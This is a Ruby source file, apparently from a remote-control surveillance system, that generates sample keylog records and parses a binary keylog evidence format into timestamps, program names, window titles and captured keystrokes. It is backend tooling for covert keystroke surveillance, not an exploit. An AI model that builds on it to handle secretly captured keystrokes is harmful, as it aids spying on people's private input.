# encoding: utf-8

require 'rcs-common/evidence/common'

module RCS

module KeylogEvidence

  ELEM_DELIMITER = 0xABADC0DE
  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
  
  def content
    proc_name = ["ruby", "python", "go", "javascript", "c++", "java"].sample.to_utf16le_binary_null
    window_name = ["Ruby Backdoor!", "Python Backdoor!", "Go Backdoor!", "Javascript Backdoor!", "C++ Backdoor!", "Java Backdoor!"].sample.to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write proc_name
    content.write window_name
    content.write [ ELEM_DELIMITER ].pack('L')
    keystrokes = KEYSTROKES.sample.to_utf16le_binary_null
    content.write keystrokes
    content.string
  end
  
  def generate_content
    ret = Array.new
    # insert first two bytes to null terminate the string
	  ret << [0].pack('S') + content()
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content(common_info, chunks)
    
    stream = StringIO.new chunks.join
    stream.read 2 # first 2 bytes of null termination (Naga weirdness ...)

    until stream.eof?

      tm = stream.read 36
      timestamp = tm.unpack('l*')
      
      #puts "STREAM POS #{stream.pos} SIZE #{stream.size}"
      #puts "TIMESTAMP #{timestamp.inspect} OBJECT_ID #{self.object_id}"

      info = Hash[common_info]
      info[:acquired] = Time.gm(*timestamp, 0)
      info[:data] = Hash.new if info[:data].nil?
      info[:data][:program] = ''
      info[:data][:window] = ''
      info[:data][:content] = ''
      
      process_name = stream.read_utf16le_string
      #puts "PROCESS NAME UTF-16LE #{process_name}"
      info[:data][:program] = process_name.utf16le_to_utf8 unless process_name.nil?

      #puts "PROCESS NAME UTF-8 #{info[:data][:process]}"

      window_name = stream.read_utf16le_string
      info[:data][:window] = window_name.utf16le_to_utf8 unless window_name.nil?
      
      #puts "WINDOW NAME #{info[:data][:window]}"
      
      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed KEYLOG (missing delimiter)") unless delim == ELEM_DELIMITER
      
      #puts "DELIM #{delim.to_s(16)}"
      
      keystrokes = stream.read_utf16le_string
      #puts "KEYSTROKES UTF-16LE #{keystrokes}"
      info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
      
      #puts "KEYSTROKES UTF-8 #{info[:data][:content]}"
      
      yield info if block_given?
    end
    :delete_raw
  end
end

end # ::RCS